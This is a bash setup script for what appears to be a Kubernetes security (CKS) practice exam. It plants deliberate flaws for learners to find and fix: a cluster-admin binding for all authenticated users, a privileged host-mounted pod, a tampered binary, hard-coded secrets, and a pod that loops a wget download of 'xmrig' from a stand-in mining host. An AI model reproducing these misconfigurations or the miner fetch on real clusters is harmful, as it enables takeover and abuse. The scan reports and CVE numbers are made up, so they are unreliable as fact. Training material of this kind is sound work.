#!/bin/bash
# cks-01 exam environment setup (idempotent). Must finish within the 180 s budget,
# so we never wait for workloads to become Ready — only for the cluster itself.
#
#  - namespaces prod / apps / sys-hard / restricted-ns / supply / runtime
#  - Q1  traffic pods frontend/other + backend pod & service in prod
#  - Q3  binaries + checksum file in ~/work/binaries (kubelet tampered AFTER summing)
#  - Q4  over-privileged ServiceAccount ci-bot (ClusterRole admin via RoleBinding)
#  - Q5  deployment web using the default SA (token automounted)
#  - Q6  dangerous ClusterRoleBinding debug-admin-binding (cluster-admin -> system:authenticated)
#  - Q7/Q8 workloads runner (no seccomp) / node-tool (privileged+hostPID+hostNetwork+hostPath)
#  - Q10 deployment legacy violating the restricted profile
#  - Q11 secret db-creds
#  - Q12 insecure Dockerfile in ~/work/audit
#  - Q13 three deployments in supply + pre-computed scan reports in ~/work/scans
#  - Q14 deployment pinned (tag-referenced image)
#  - Q16 three deployments in runtime, one with a crypto-miner-like process
#  - answers directory ~/answers
set -e
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
mkdir -p ~/answers ~/work

# 1) wait for the cluster (max 150 s)
for i in $(seq 1 75); do
  kubectl get nodes 2>/dev/null | grep -q ' Ready' && kubectl get sa default -n default >/dev/null 2>&1 && break
  sleep 2
done

# 2) namespaces
for ns in prod apps sys-hard restricted-ns supply runtime; do
  kubectl create namespace "$ns" --dry-run=client -o yaml | kubectl apply -f - >/dev/null
done

# 3) Q1 — backend/frontend/other pods + service in prod (pulls busybox/nginx early)
kubectl apply -f - >/dev/null <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: backend
  namespace: prod
  labels: { app: backend }
spec:
  containers:
    - name: web
      image: nginx:1.26
      ports: [{ containerPort: 80 }]
      resources: { requests: { cpu: 20m, memory: 32Mi } }
---
apiVersion: v1
kind: Pod
metadata:
  name: frontend
  namespace: prod
  labels: { app: frontend }
spec:
  containers:
    - name: c
      image: busybox:1.36
      command: ["sh", "-c", "sleep 86400"]
      resources: { requests: { cpu: 10m, memory: 16Mi } }
---
apiVersion: v1
kind: Pod
metadata:
  name: other
  namespace: prod
  labels: { app: other }
spec:
  containers:
    - name: c
      image: busybox:1.36
      command: ["sh", "-c", "sleep 86400"]
      resources: { requests: { cpu: 10m, memory: 16Mi } }
---
apiVersion: v1
kind: Service
metadata:
  name: web-svc
  namespace: prod
spec:
  selector: { app: backend }
  ports:
    - port: 80
      targetPort: 80
YAML

# 4) Q3 — three "release binaries" + checksum file; kubelet is tampered after summing
if [ ! -f ~/work/binaries/checksums.txt ]; then
  mkdir -p ~/work/binaries
  printf 'snacklab release build kube-apiserver v1.36.2\n%s\n' "$(seq 1 2000)" > ~/work/binaries/kube-apiserver
  printf 'snacklab release build kubelet v1.36.2\n%s\n'        "$(seq 1 2000)" > ~/work/binaries/kubelet
  printf 'snacklab release build kube-proxy v1.36.2\n%s\n'     "$(seq 1 2000)" > ~/work/binaries/kube-proxy
  (cd ~/work/binaries && sha512sum kube-apiserver kubelet kube-proxy > checksums.txt)
  printf '\x00' >> ~/work/binaries/kubelet   # the supply-chain "attack"
fi

# 5) Q4 — over-privileged CI ServiceAccount
kubectl create serviceaccount ci-bot -n apps --dry-run=client -o yaml | kubectl apply -f - >/dev/null
kubectl create rolebinding ci-bot-rb -n apps \
  --clusterrole=admin --serviceaccount=apps:ci-bot \
  --dry-run=client -o yaml | kubectl apply -f - >/dev/null

# 6) Q5 — deployment web on the default SA (token automounted)
kubectl apply -f - >/dev/null <<'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
  namespace: apps
spec:
  replicas: 1
  selector: { matchLabels: { app: web } }
  template:
    metadata:
      labels: { app: web }
    spec:
      containers:
        - name: web
          image: nginx:1.26
          resources: { requests: { cpu: 20m, memory: 32Mi } }
YAML

# 7) Q6 — the dangerous binding the learner must find and delete
kubectl create clusterrolebinding debug-admin-binding \
  --clusterrole=cluster-admin --group=system:authenticated \
  --dry-run=client -o yaml | kubectl apply -f - >/dev/null

# 8) Q7/Q8 — runner (no seccomp) and node-tool (full host access)
kubectl apply -f - >/dev/null <<'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: runner
  namespace: sys-hard
spec:
  replicas: 2
  selector: { matchLabels: { app: runner } }
  template:
    metadata:
      labels: { app: runner }
    spec:
      containers:
        - name: runner
          image: busybox:1.36
          command: ["sh", "-c", "sleep 86400"]
          resources: { requests: { cpu: 10m, memory: 16Mi } }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: node-tool
  namespace: sys-hard
spec:
  replicas: 1
  selector: { matchLabels: { app: node-tool } }
  template:
    metadata:
      labels: { app: node-tool }
    spec:
      hostPID: true
      hostNetwork: true
      containers:
        - name: tool
          image: busybox:1.36
          command: ["sh", "-c", "sleep 86400"]
          securityContext: { privileged: true }
          volumeMounts:
            - { name: host, mountPath: /host }
          resources: { requests: { cpu: 10m, memory: 16Mi } }
      volumes:
        - name: host
          hostPath: { path: / }
YAML

# 9) Q10 — legacy deployment violating the restricted profile
kubectl apply -f - >/dev/null <<'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: legacy
  namespace: restricted-ns
spec:
  replicas: 1
  selector: { matchLabels: { app: legacy } }
  template:
    metadata:
      labels: { app: legacy }
    spec:
      containers:
        - name: legacy
          image: busybox:1.36
          command: ["sh", "-c", "sleep 86400"]
          securityContext: { privileged: true }
          resources: { requests: { cpu: 10m, memory: 16Mi } }
YAML

# 10) Q11 — secret the learner extracts from
kubectl create secret generic db-creds -n apps \
  --from-literal=username=appuser --from-literal=password='S3cr3t-CKS!' \
  --dry-run=client -o yaml | kubectl apply -f - >/dev/null

# 11) Q12 — insecure Dockerfile to fix
mkdir -p ~/work/audit
cat > ~/work/audit/Dockerfile <<'DOCKER'
FROM nginx:latest
ENV API_KEY=AKIA-EXAMPLE-SECRET-KEY-123
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
COPY index.html /usr/share/nginx/html/index.html
USER root
CMD ["nginx", "-g", "daemon off;"]
DOCKER

# 12) Q13 — three app deployments + pre-computed scan reports
kubectl apply -f - >/dev/null <<'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: frontend-app
  namespace: supply
spec:
  replicas: 1
  selector: { matchLabels: { app: frontend-app } }
  template:
    metadata:
      labels: { app: frontend-app }
    spec:
      containers:
        - name: web
          image: nginx:1.25
          resources: { requests: { cpu: 20m, memory: 32Mi } }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: report-app
  namespace: supply
spec:
  replicas: 1
  selector: { matchLabels: { app: report-app } }
  template:
    metadata:
      labels: { app: report-app }
    spec:
      containers:
        - name: web
          image: httpd:2.4
          resources: { requests: { cpu: 20m, memory: 32Mi } }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: batch-app
  namespace: supply
spec:
  replicas: 1
  selector: { matchLabels: { app: batch-app } }
  template:
    metadata:
      labels: { app: batch-app }
    spec:
      containers:
        - name: job
          image: busybox:1.36
          command: ["sh", "-c", "sleep 86400"]
          resources: { requests: { cpu: 10m, memory: 16Mi } }
YAML

mkdir -p ~/work/scans
cat > ~/work/scans/frontend-app.txt <<'TXT'
Image: docker.io/library/nginx:1.25   (deployment supply/frontend-app)

nginx:1.25 (debian 12.1)
Total: 14 (LOW: 9, MEDIUM: 3, HIGH: 0, CRITICAL: 2)

| Library      | Vulnerability   | Severity | Installed | Fixed in |
|--------------|-----------------|----------|-----------|----------|
| libssl3      | CVE-2024-99901  | CRITICAL | 3.0.9     | 3.0.11   |
| zlib1g       | CVE-2024-99917  | CRITICAL | 1.2.13    | 1.2.14   |
| curl         | CVE-2024-88112  | MEDIUM   | 7.88.1    | 7.88.3   |
TXT
cat > ~/work/scans/report-app.txt <<'TXT'
Image: docker.io/library/httpd:2.4   (deployment supply/report-app)

httpd:2.4 (debian 12.1)
Total: 9 (LOW: 6, MEDIUM: 2, HIGH: 0, CRITICAL: 1)

| Library      | Vulnerability   | Severity | Installed | Fixed in |
|--------------|-----------------|----------|-----------|----------|
| libaprutil1  | CVE-2024-99923  | CRITICAL | 1.6.3     | 1.6.4    |
| libexpat1    | CVE-2024-88140  | MEDIUM   | 2.5.0     | 2.5.1    |
TXT
cat > ~/work/scans/batch-app.txt <<'TXT'
Image: docker.io/library/busybox:1.36   (deployment supply/batch-app)

busybox:1.36 (musl)
Total: 2 (LOW: 2, MEDIUM: 0, HIGH: 0, CRITICAL: 0)

| Library      | Vulnerability   | Severity | Installed | Fixed in |
|--------------|-----------------|----------|-----------|----------|
| musl         | CVE-2024-77021  | LOW      | 1.2.4     | 1.2.5    |
TXT

# 13) Q14 — deployment still referencing its image by tag
kubectl apply -f - >/dev/null <<'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: pinned
  namespace: supply
spec:
  replicas: 1
  selector: { matchLabels: { app: pinned } }
  template:
    metadata:
      labels: { app: pinned }
    spec:
      containers:
        - name: web
          image: nginx:1.26
          resources: { requests: { cpu: 20m, memory: 32Mi } }
YAML

# 14) Q16 — three workloads in runtime; logshipper carries the miner-like process.
# The wget loop never succeeds (the host does not resolve) — that is intentional,
# the pod just has to stay Running with a suspicious cmdline visible in ps.
kubectl apply -f - >/dev/null <<'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
  namespace: runtime
spec:
  replicas: 1
  selector: { matchLabels: { app: web } }
  template:
    metadata:
      labels: { app: web }
    spec:
      containers:
        - name: web
          image: nginx:1.26
          resources: { requests: { cpu: 20m, memory: 32Mi } }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: metrics
  namespace: runtime
spec:
  replicas: 1
  selector: { matchLabels: { app: metrics } }
  template:
    metadata:
      labels: { app: metrics }
    spec:
      containers:
        - name: agent
          image: busybox:1.36
          command: ["sh", "-c", "sleep 86400"]
          resources: { requests: { cpu: 10m, memory: 16Mi } }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: logshipper
  namespace: runtime
spec:
  replicas: 1
  selector: { matchLabels: { app: logshipper } }
  template:
    metadata:
      labels: { app: logshipper }
    spec:
      containers:
        - name: shipper
          image: busybox:1.36
          command: ["sh", "-c", "while true; do wget -q -T 2 -O /tmp/xmrig http://pool.minexmr.example/xmrig >/dev/null 2>&1; sleep 30; done"]
          resources: { requests: { cpu: 10m, memory: 16Mi } }
YAML

echo "PASS"
